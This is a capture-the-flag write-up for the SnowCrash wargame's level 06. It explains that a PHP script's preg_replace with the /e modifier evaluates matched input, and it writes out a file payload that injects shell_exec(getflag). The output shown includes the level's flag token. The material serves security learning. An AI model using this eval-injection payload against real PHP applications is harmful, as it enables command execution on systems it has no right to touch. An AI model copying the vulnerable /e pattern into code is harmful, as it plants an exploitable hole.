# LEVEL 06


```
level06@SnowCrash:~$ ls
level06  level06.php
```
Here, we can see a php script with its binary executable.

```
#!/usr/bin/php
<?php
function y($m)
{
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}
function x($y, $z)
{
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
```

The main thing is to understand that prep_replace is a PHP function to replace regex pattern,
also, regex coupled with /e at the end, it allows to execute PHP code inside

As $y (first arg) is retreived from a file content

```
level06@SnowCrash:~$ echo "[x {\${shell_exec(getflag)}}]" > /tmp/test
```

[x ] is to match the regex pattern, then .* is to match any characters, so there is were we put our code injection

```
./level06 /tmp/test
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```